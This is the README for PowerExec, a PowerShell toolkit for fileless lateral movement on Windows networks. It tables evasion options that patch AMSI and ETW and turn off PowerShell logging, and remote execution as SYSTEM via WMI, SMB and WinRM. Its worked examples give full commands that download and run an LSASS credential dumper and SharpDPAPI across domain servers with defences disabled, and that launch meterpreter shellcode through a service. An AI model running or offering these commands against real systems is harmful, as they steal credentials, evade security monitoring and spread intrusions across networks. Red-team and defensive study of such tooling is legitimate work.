# PowerExec

PowerExec combines various bypass techniques and execution methods for fileless lateral movement.


## Functions

```
Invoke-PowerExec                -   runs PowerShell script block on remote computers through various execution methods
New-PowerLoader                 -   builds script block for in-memory execution of various payload types
```


## Payload types

The payload type must be specified within the function `New-PowerLoader`:

| Type      | Description                               |
| --------- | ----------------------------------------- |
| PoSh      | PowerShell script                         |
| NetAsm    | .NET assembly executable                  |
| Shellcode | Shellcode in binary format (experimental) |

Resulting PowerShell script block is built either from a local payload file or from a remote payload using a download cradle.


## Bypass techniques

Bypass techniques can be specified within the function `New-PowerLoader`:

| Bypass | Description                                              |
| ------ | -------------------------------------------------------- |
| AMSI   | Bypass Antimalware Scan Interface via in-memory patching |
| ETW    | Bypass Event Tracing for Windows via in-memory patching  |
| SBL    | Disable PowerShell Script Block Logging                  |
| PML    | Disable PowerShell Module Logging                        |
| PRM    | Disable PowerShell Readline Module                       |


## Execution methods

The execution method must be specified within the function `Invoke-PowerExec`:

| Method          | Description                                                            |
| --------------- | ---------------------------------------------------------------------- |
| CimProcess      | Create process via WMI                                                 |
| CimService      | Create temporary service running as NT AUTHORITY\SYSTEM via WMI        |
| CimSubscription | Create temporary WMI event subscription (experimental)                 |
| CimTask         | Create temporary scheduled task running as NT AUTHORITY\SYSTEM via WMI |
| SmbService      | Create temporary service running as NT AUTHORITY\SYSTEM via SMB        |
| WinRM           | Run powershell via Windows Remote Management                           |

For WMI methods, the transport protocol can be chosen between DCOM and WSMAN.

The execution output is retrieved regardless of the method used.


## Examples

Run a PowerShell script through WinRM while bypassing AMSI, PowerShell Module Logging and Script Block Logging:

```
PS C:\> $payload = New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/tmenochet/PowerDump/master/LsassDump.ps1' -ArgumentList 'Invoke-LsassDump' -Bypass AMSI,PML,SBL
PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method WinRM -ComputerDomain ADATUM.CORP -ComputerFilter Servers
```

Run a .NET assembly through WMI while bypassing AMSI and ETW:

```
PS C:\> $payload = New-PowerLoader -Type NetAsm -FileUrl 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/SharpDPAPI.exe' -ArgumentList 'machinecredentials' -Bypass ETW,AMSI
PS C:\> Invoke-PowerExec -ScriptBlock $payload -Method CimProcess -Protocol Dcom -ComputerList 192.168.1.1,192.168.1.2
```

Run a shellcode through a service:

```
PS C:\> New-PowerLoader -Type Shellcode -FilePath .\meterpreter.bin | Invoke-PowerExec -ComputerList 192.168.1.1 -Method CimService -Protocol Dcom
```


## Credits

  * https://rastamouse.me/blog/asb-bypass-pt3/
  * https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
  * https://www.bc-security.org/post/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/
  * https://blog.xpnsec.com/hiding-your-dotnet-etw
  * https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html
  * https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/
